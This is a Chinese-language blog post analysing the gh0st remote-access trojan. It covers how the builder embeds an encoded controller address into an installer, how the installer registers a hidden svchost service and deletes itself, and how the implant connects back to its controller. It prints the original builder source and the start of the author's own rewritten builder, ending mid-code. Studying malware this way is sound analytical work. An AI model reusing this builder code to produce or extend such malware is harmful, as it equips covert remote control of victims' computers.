<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#f5b8d5"><meta name="author" content="l1pmoluy,1392181761@qq.com"><meta name="copyright" content="l1pmoluy"><meta name="generator" content="Hexo 7.3.0"><meta name="theme" content="hexo-theme-yun"><title>gh0stæºç åˆ†æ | l1pmoluy</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#f5b8d5"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"l1pmoluy.github.io","root":"/","title":"è¸ç€æ¢¦èµ°è¿‡æ—¶å…‰","version":"1.10.11","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"æœç´¢...","empty":"æ‰¾ä¸åˆ°æ‚¨æŸ¥è¯¢çš„å†…å®¹: ${query}","hits":"æ‰¾åˆ° ${hits} æ¡ç»“æœ","hits_time":"æ‰¾åˆ° ${hits} æ¡ç»“æœï¼ˆç”¨æ—¶ ${time} æ¯«ç§’ï¼‰"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"algolia":{"hits":{"per_page":8}},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="l1pmoluy" type="application/atom+xml"><script>(function(){
  var bp = document.createElement('script');
  var curProtocol = window.location.protocol.split(':')[0];
  if (curProtocol === 'https') {
    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
  }
  else {
    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
  }
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(bp, s);
})();</script><meta name="description" content="gh0stæºç åˆ†æ">
<meta property="og:type" content="article">
<meta property="og:title" content="gh0stæºç åˆ†æ">
<meta property="og:url" content="https://l1pmoluy.github.io/2025/10/08/gh0st%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/index.html">
<meta property="og:site_name" content="l1pmoluy">
<meta property="og:description" content="gh0stæºç åˆ†æ">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2025-10-08T06:55:14.000Z">
<meta property="article:modified_time" content="2025-10-08T07:29:56.019Z">
<meta property="article:author" content="l1pmoluy">
<meta property="article:tag" content="é¡¹ç›®">
<meta name="twitter:card" content="summary"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="æ–‡ç« ç›®å½•"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="ç«™ç‚¹æ¦‚è§ˆ"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="l1pmoluy"><img width="96" loading="lazy" src="/images/rika.jpg" alt="l1pmoluy"><span class="site-author-status" title="Looking for dawn.">ğŸ¥°</span></a><div class="site-author-name"><a href="/about/">l1pmoluy</a></div><span class="site-name">l1pmoluy</span><sub class="site-subtitle">Dawing...</sub><div class="site-description">l1pmoluy's blog</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="é¦–é¡µ"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="å½’æ¡£"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">11</span></a></div><div class="site-state-item"><a href="/categories/" title="åˆ†ç±»"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">2</span></a></div><div class="site-state-item"><a href="/tags/" title="æ ‡ç­¾"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">3</span></a></div><a class="site-state-item hty-icon-button" href="/about/#comment" title="ç•™è¨€æ¿"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:clipboard-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" title="1392181761" target="_blank" style="color:#12B7F5"><span class="icon iconify" data-icon="ri:qq-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://blog.csdn.net/dawn_ing_" title="csdn" target="_blank" style="color:#e83b07"><span class="icon iconify" data-icon="ri:terminal-box-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://bbs.kanxue.com/user-home-1012312.htm" title="çœ‹é›ª" target="_blank" style="color:#e83b07"><span class="icon iconify" data-icon="ri:snowflake-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="1392181761@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://www.yuque.com/l1pmpluy" title="è¯­é›€" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:yuque-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="å‹é“¾" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:user-community-line"></span></a><a class="links-item hty-icon-button" href="/girl/" title="å–œæ¬¢çš„å¥³å­©å­" style="color:hotpink"><span class="icon iconify" data-icon="ri:women-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#dEJeZ"><span class="toc-number">1.</span> <span class="toc-text">æµç¨‹ç†è§£</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SX86Z"><span class="toc-number">2.</span> <span class="toc-text">ä»£ç ç»“æ„</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ce3dE"><span class="toc-number">3.</span> <span class="toc-text">æºç åˆ†æ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bILXS"><span class="toc-number">3.1.</span> <span class="toc-text">å®¢æˆ·ç«¯éƒ¨åˆ†</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSc7y"><span class="toc-number">3.2.</span> <span class="toc-text">æœåŠ¡ç«¯éƒ¨åˆ†</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#thIjT"><span class="toc-number">3.2.1.</span> <span class="toc-text">install</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#kGzUH"><span class="toc-number">3.2.2.</span> <span class="toc-text">svchost</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#k85PT"><span class="toc-number">3.2.2.1.</span> <span class="toc-text">FileManager</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#egIuX"><span class="toc-number">3.2.2.2.</span> <span class="toc-text">ScreenManager</span></a></li></ol></li></ol></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#f5b8d5;"><link itemprop="mainEntityOfPage" href="https://l1pmoluy.github.io/2025/10/08/gh0st%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="l1pmoluy,1392181761@qq.com"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="l1pmoluy"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">gh0stæºç åˆ†æ</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="åˆ›å»ºæ—¶é—´ï¼š2025-10-8 14:55:14" itemprop="dateCreated datePublished" datetime="2025-10-08T14:55:14+08:00">2025-10-8</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="æœ¬æ–‡å­—æ•°"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="æœ¬æ–‡å­—æ•°">3k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="é˜…è¯»æ—¶é•¿"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="é˜…è¯»æ—¶é•¿">15m</span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E9%80%86%E5%90%91%E8%A1%8C%E9%A9%B6/" style="--text-color:#FF0000" itemprop="url" rel="index"><span itemprop="text">é€†å‘è¡Œé©¶</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/%E9%A1%B9%E7%9B%AE/" style="--text-color:#800080"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">é¡¹ç›®</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><p>gh0stæºç åˆ†æ</p>
<span id="more"></span>

<h2 id="dEJeZ">æµç¨‹ç†è§£</h2>

<p>å®¢æˆ·ç«¯é€šè¿‡æœ¬åœ°æ¨¡æ¿å¹¶å†™å…¥ä¿¡æ¯ç”ŸæˆæœåŠ¡ç«¯-install.exe å…·ä½“é€»è¾‘å°†æå‰æ”¾åœ¨.rdataä¸­çš„dllå–å‡ºï¼Œå¹¶æ³¨å†ŒæœåŠ¡åœ¨svchostä¸‹</p>
<p>dllçš„å†…å®¹æ˜¯åˆ å»install.exeå¹¶ä¸”è‡ªè¡Œéšè—ï¼Œç„¶åå–å‡ºåŠ å¯†åçš„ipè§£å¯†ï¼Œå‘å®¢æˆ·ç«¯å‘é€éšæœºäº‹ä»¶åï¼Œå“åº”åæ ¹æ®å‘æ¥çš„åŒ…å†³å®šè½¬æ¥å“ªä¸ªManagerï¼Œå¦‚FIleï¼ŒScreenç­‰</p>
<h2 id="SX86Z">ä»£ç ç»“æ„</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gh0st/</span><br><span class="line">â”œâ”€gh0st/</span><br><span class="line">|   â”œâ”€gh0st.cpp				 #å®¢æˆ·ç«¯çš„åˆå§‹åŒ–</span><br><span class="line">|		â”œâ”€BuildView.cpp		 #è¯»å–Serveræ–‡ä»¶ï¼Œå†™å…¥åŠ å¯†ä¿¡æ¯</span><br><span class="line">|		â””â”€â”€SettingsView.cpp#ipå’Œç«¯å£å·çš„å¡«å†™åŠ å¯†</span><br><span class="line">â”œâ”€install/</span><br><span class="line">|		â””â”€install.cpp			 #è¿è¡Œæ—¶è§£å¯†å‡ºéœ€è¦çš„ä¿¡æ¯ï¼Œå–å‡ºsvchostæŒ‚åœ¨æœåŠ¡ä¸‹</span><br><span class="line">â””â”€svchost/</span><br><span class="line"> 		â”œâ”€svchost.cpp			 #åˆ é™¤installï¼ŒåŸºæœ¬ä¸Šå°±éšè—äº†ï¼Œç„¶åç™»å½•å®¢æˆ·ç«¯ï¼Œè°ƒç”¨</span><br><span class="line">    |                  #KernelManagerç­‰å¾…å“åº”</span><br><span class="line"> 		â”œâ”€KernelManager.cpp#åˆ†å‘Managerçš„ï¼Œæ¯”å¦‚Screenã€Keyboard</span><br><span class="line"> 		â”œâ”€FileManager.cpp	 #æ¥æ”¶å®¢æˆ·ç«¯çš„ä¿¡æ¯è¿›è¡Œæ–‡ä»¶æ“ä½œ</span><br><span class="line"> 		â””â”€ScreenManager.cpp#æ¥æ”¶å®¢æˆ·ç«¯ä¿¡æ¯è¿›è¡Œå±å¹•æ“ä½œ</span><br></pre></td></tr></table></figure>

<h2 id="ce3dE">æºç åˆ†æ</h2>
<h3 id="bILXS">å®¢æˆ·ç«¯éƒ¨åˆ†</h3>
ä»æ¨¡æ¿install.exeä¸­ç”ŸæˆæœåŠ¡ç«¯exe



<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CBuildView::OnBuild</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> Add your control notification handler code here</span></span><br><span class="line">	<span class="built_in">UpdateData</span>(<span class="literal">true</span>);</span><br><span class="line">	<span class="keyword">if</span> (m_ServiceDisplayName.<span class="built_in">IsEmpty</span>() || m_ServiceDescription.<span class="built_in">IsEmpty</span>())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">AfxMessageBox</span>(<span class="string">&quot;è¯·å®Œæ•´å¡«å†™æœåŠ¡æ˜¾ç¤ºåç§°å’Œæè¿° -:(&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	CString strAddress;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// ä¿å­˜é…ç½®</span></span><br><span class="line">	((CGh0stApp *)<span class="built_in">AfxGetApp</span>())-&gt;m_IniFile.<span class="built_in">SetString</span>(<span class="string">&quot;Build&quot;</span>, <span class="string">&quot;DisplayName&quot;</span>, m_ServiceDisplayName);</span><br><span class="line">	((CGh0stApp *)<span class="built_in">AfxGetApp</span>())-&gt;m_IniFile.<span class="built_in">SetString</span>(<span class="string">&quot;Build&quot;</span>, <span class="string">&quot;Description&quot;</span>, m_ServiceDescription);</span><br><span class="line">	((CGh0stApp *)<span class="built_in">AfxGetApp</span>())-&gt;m_IniFile.<span class="built_in">SetInt</span>(<span class="string">&quot;Build&quot;</span>, <span class="string">&quot;enablehttp&quot;</span>, m_enable_http);</span><br><span class="line">	<span class="keyword">if</span> (m_enable_http)</span><br><span class="line">	&#123;</span><br><span class="line">		CString str;</span><br><span class="line">		<span class="built_in">GetDlgItemText</span>(IDC_URL, str);</span><br><span class="line">		((CGh0stApp *)<span class="built_in">AfxGetApp</span>())-&gt;m_IniFile.<span class="built_in">SetString</span>(<span class="string">&quot;Build&quot;</span>, <span class="string">&quot;httpurl&quot;</span>, str);</span><br><span class="line">		str.<span class="built_in">MakeLower</span>();</span><br><span class="line">		strAddress = <span class="built_in">MyEncode</span>(str.<span class="built_in">GetBuffer</span>(<span class="number">0</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">GetDlgItemText</span>(IDC_DNS_STRING, strAddress);</span><br><span class="line">        <span class="comment">//è¯»å–æ ¼å¼ä¸ºAAAAåŠ å¯†åçš„ipAAAA</span></span><br><span class="line">		<span class="keyword">if</span> (strAddress.<span class="built_in">Find</span>(<span class="string">&quot;AAAA&quot;</span>) == <span class="number">-1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">AfxMessageBox</span>(<span class="string">&quot;åŸŸåä¸Šçº¿å­—ä¸²æ ¼å¼å‡ºé”™ -:(&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		strAddress.<span class="built_in">Replace</span>(<span class="string">&quot;AAAA&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">	CString		strServiceConfig;</span><br><span class="line">	strServiceConfig.<span class="built_in">Format</span>(<span class="string">&quot;%s|%s&quot;</span>, <span class="built_in">MyEncode</span>(m_ServiceDisplayName.<span class="built_in">GetBuffer</span>(<span class="number">0</span>)), </span><br><span class="line">		<span class="built_in">MyEncode</span>(m_ServiceDescription.<span class="built_in">GetBuffer</span>(<span class="number">0</span>)));</span><br><span class="line">    </span><br><span class="line">	<span class="function">CFileDialog <span class="title">dlg</span><span class="params">(FALSE, <span class="string">&quot;exe&quot;</span>, <span class="string">&quot;server.exe&quot;</span>, OFN_OVERWRITEPROMPT,<span class="string">&quot;å¯æ‰§è¡Œæ–‡ä»¶|*.exe&quot;</span>, <span class="literal">NULL</span>)</span></span>;</span><br><span class="line">	<span class="keyword">if</span>(dlg.<span class="built_in">DoModal</span> () != IDOK)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	</span><br><span class="line">	HINSTANCE	hInstance;</span><br><span class="line">	HRSRC		hResInfo;</span><br><span class="line">	DWORD		dwResLen;</span><br><span class="line">	HGLOBAL		hResData;</span><br><span class="line">	LPBYTE		lpData;</span><br><span class="line">	hInstance = <span class="built_in">AfxGetApp</span>()-&gt;m_hInstance;</span><br><span class="line">	hResInfo = <span class="built_in">FindResource</span>(hInstance, (LPCTSTR)IDR_BSS, (LPCTSTR)<span class="string">&quot;BSS&quot;</span>);</span><br><span class="line">	dwResLen = <span class="built_in">SizeofResource</span>(hInstance, hResInfo);</span><br><span class="line">	hResData = <span class="built_in">LoadResource</span>(hInstance, hResInfo);</span><br><span class="line">	lpData = (LPBYTE)<span class="built_in">LockResource</span>(hResData);</span><br><span class="line"></span><br><span class="line">	CFile file;</span><br><span class="line">	<span class="keyword">if</span>(file.<span class="built_in">Open</span> (dlg.<span class="built_in">GetPathName</span>(), CFile::modeCreate | CFile::modeWrite))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">try</span></span><br><span class="line">		&#123;</span><br><span class="line">			file.<span class="built_in">Write</span>(lpData, dwResLen);</span><br><span class="line">			<span class="comment">// å†™å…¥6ä¸ª&#x27;C&#x27;,æ˜¯æœåŠ¡çš„åç§°å’Œæè¿°</span></span><br><span class="line">			file.<span class="built_in">Write</span>(<span class="string">&quot;CCCCCC&quot;</span>, <span class="number">6</span>);</span><br><span class="line">			file.<span class="built_in">Write</span>(strServiceConfig, strServiceConfig.<span class="built_in">GetLength</span>() + <span class="number">1</span>);</span><br><span class="line">			<span class="comment">// å†™å…¥6ä¸ª&#x27;A&#x27;,å®‰è£…æ—¶æŸ¥æ‰¾</span></span><br><span class="line">			file.<span class="built_in">Write</span>(<span class="string">&quot;AAAAAA&quot;</span>, <span class="number">6</span>);</span><br><span class="line">			file.<span class="built_in">Write</span>(strAddress, strAddress.<span class="built_in">GetLength</span>() + <span class="number">1</span>);</span><br><span class="line">			file.<span class="built_in">Close</span>();</span><br><span class="line">			<span class="built_in">AfxMessageBox</span>(<span class="string">&quot;æ–‡ä»¶ä¿å­˜æˆåŠŸï¼Œè¯·ç”¨åŠ å£³è½¯ä»¶è¿›è¡Œå‹ç¼© -:)&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">catch</span>(...)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">MessageBox</span>(<span class="string">&quot;æ–‡ä»¶ä¿å­˜å¤±è´¥ï¼Œè¯·æ£€æŸ¥&quot;</span>,<span class="string">&quot;æç¤º&quot;</span>,MB_OK|MB_ICONSTOP);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">FreeResource</span>(hResData);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>è¿™é‡Œæ¯æ¬¡æ”¹åŠ¨dllæˆ–è€…install.exeçš„æ—¶å€™éƒ½è¦æŒ‰ç…§svchost-&gt;install-&gt;gh0stçš„é¡ºåºå…¨éƒ¨é‡æ–°ç¼–è¯‘ï¼Œæ‰€ä»¥è‡ªå·±å¤ç°äº†ä¸€ä¸ªç›´æ¥å‡­å€Ÿinstall.exeç”Ÿæˆç›®æ ‡æ–‡ä»¶çš„ä»£ç </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">char</span> base64[] = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">base64_encode</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* data, <span class="type">int</span> size, <span class="type">char</span>** str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span>* s, * p;</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	<span class="type">int</span> c;</span><br><span class="line">	<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* q;</span><br><span class="line"></span><br><span class="line">	p = s = (<span class="type">char</span>*)<span class="built_in">malloc</span>(size * <span class="number">4</span> / <span class="number">3</span> + <span class="number">4</span>);</span><br><span class="line">	<span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	q = (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>*)data;</span><br><span class="line">	i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size;) &#123;</span><br><span class="line">		c = q[i++];</span><br><span class="line">		c *= <span class="number">256</span>;</span><br><span class="line">		<span class="keyword">if</span> (i &lt; size)</span><br><span class="line">			c += q[i];</span><br><span class="line">		i++;</span><br><span class="line">		c *= <span class="number">256</span>;</span><br><span class="line">		<span class="keyword">if</span> (i &lt; size)</span><br><span class="line">			c += q[i];</span><br><span class="line">		i++;</span><br><span class="line">		p[<span class="number">0</span>] = base64[(c &amp; <span class="number">0x00fc0000</span>) &gt;&gt; <span class="number">18</span>];</span><br><span class="line">		p[<span class="number">1</span>] = base64[(c &amp; <span class="number">0x0003f000</span>) &gt;&gt; <span class="number">12</span>];</span><br><span class="line">		p[<span class="number">2</span>] = base64[(c &amp; <span class="number">0x00000fc0</span>) &gt;&gt; <span 